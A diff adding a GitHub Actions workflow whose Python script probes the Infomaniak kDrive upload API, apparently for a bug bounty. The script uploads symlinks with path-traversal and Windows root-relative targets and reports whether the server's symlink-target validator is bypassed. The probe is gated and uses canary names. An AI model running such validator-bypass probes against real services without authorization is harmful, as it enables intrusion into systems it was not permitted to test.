@@ -1,0 +1,69 @@
+name: kDrive v3 final gated symlink probe
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  final-gated-probe:
+    runs-on: ubuntu-latest
+    env:
+      KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
+    steps:
+      - name: Install dependencies
+        run: python -m pip install --quiet requests xxhash
+
+      - name: Test validator only in writable controlled Private directory
+        shell: python
+        run: |
+          import json, os, sys, time
+          import requests, xxhash
+          token=os.environ.get('KDRIVE_TOKEN','')
+          if not token: print('[STOP] missing token'); sys.exit(2)
+          print(f'::add-mask::{token}')
+          drive_id=3896576
+          directory_id=5
+          ua='kDrive-YWH-v3-canary/1.0 Infomaniak-YWH-Bugbounty'
+          url=f'https://api.infomaniak.com/3/drive/{drive_id}/upload'
+          headers={'Authorization':f'Bearer {token}','User-Agent':ua,'Accept':'application/json','Content-Type':'inode/folder-symlink'}
+          def send(label,target):
+              now=int(time.time()); body=target.encode('utf-8')
+              params={
+                  'file_name':f'ywh-v3-{label}-{now}',
+                  'directory_id':str(directory_id),
+                  'total_size':str(len(body)),
+                  'file_name':f'ywh-v3-{label}-{now}',
+                  'conflict':'error',
+                  'symbolic_link':target,
+                  'total_chunk_hash':'xxh3:'+xxhash.xxh3_64_hexdigest(body).lower(),
+                  'created_at':str(now),
+                  'last_modified_at':str(now),
+              }
+              r=requests.post(url,headers=headers,params=params,data=body,timeout=60)
+              print(f'[{label}] HTTP={r.status_code}')
+              try:o=r.json()
+              except Exception:
+                  print(f'[{label}] non_json=true'); return None,False
+              e=o.get('error') or {}; blob=json.dumps(o)
+              rule='validation_rule_symbolic_link_target_rule' in blob
+              print(f"[{label}] result={o.get('result')} code={e.get('code')} reason={e.get('reason')} validator_rule={str(rule).lower()}")
+              if o.get('result')=='success':
+                  d=o.get('data') or {}; print(f"[{label}] created_file_id={d.get('id')} mime_type={d.get('mime_type')}")
+              return o,rule
+
+          baseline,baseline_rule=send('baseline-parent',r'..\kdrive-bounty-canary-target')
+          if baseline is None:
+              print('[RESULT] INCONCLUSIVE_NON_JSON'); sys.exit(0)
+          if baseline.get('result')=='success':
+              print('[RESULT] V3_ACCEPTS_KNOWN_INVALID_BASELINE_STOP'); sys.exit(0)
+          if not baseline_rule:
+              print('[RESULT] V3_BASELINE_REJECTED_OTHER_REASON_STOP'); sys.exit(0)
+          print('[GATE] intended validator active; now testing Windows root-relative target')
+          root,root_rule=send('root-relative',r'\kdrive-bounty-canary-target')
+          if root is None: print('[RESULT] ROOT_RELATIVE_INCONCLUSIVE')
+          elif root.get('result')=='success': print('[RESULT] V3_WINDOWS_ROOT_RELATIVE_VALIDATOR_BYPASS_CONFIRMED')
+          elif root_rule: print('[RESULT] V3_WINDOWS_ROOT_RELATIVE_CORRECTLY_REJECTED')
+          else: print('[RESULT] V3_WINDOWS_ROOT_RELATIVE_REJECTED_OTHER_REASON')
